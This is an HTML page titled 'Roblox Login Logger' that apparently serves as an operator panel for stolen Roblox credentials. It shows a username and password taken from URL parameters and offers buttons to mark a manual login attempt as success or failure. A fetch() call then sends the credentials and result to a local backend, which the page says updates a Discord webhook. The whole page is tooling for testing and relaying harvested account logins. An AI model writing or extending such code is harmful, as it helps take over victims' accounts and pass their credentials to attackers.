<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox Login Logger</title>
</head>
<body>
    <h2>Roblox Login Logger</h2>

    <div>
        <p><strong>User:</strong> <span id="username"></span></p>
        <p><strong>Password:</strong> <span id="password"></span></p>
        <p><strong>Status:</strong> <span id="status">❌ Pending Manual Login</span></p>

        <button onclick="updateStatus('success')">✅ Mark as Success</button>
        <button onclick="updateStatus('failed')">❌ Mark as Failed</button>
    </div>

    <script>
        // Example: You can replace these dynamically or get from query params
        const username = new URLSearchParams(window.location.search).get('user') || 'DevSccz';
        const password = new URLSearchParams(window.location.search).get('pass') || 'DevScczcookin';

        document.getElementById('username').innerText = username;
        document.getElementById('password').innerText = password;

        function updateStatus(result) {
            fetch('http://127.0.0.1:6969/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password, status: result })
            })
            .then(() => {
                document.getElementById('status').innerText = result === 'success' ? '✅ Success' : '❌ Failed';
                alert('Discord webhook updated!');
            })
            .catch(err => alert('Failed to update backend: ' + err));
        }
    </script>
</body>
</html>
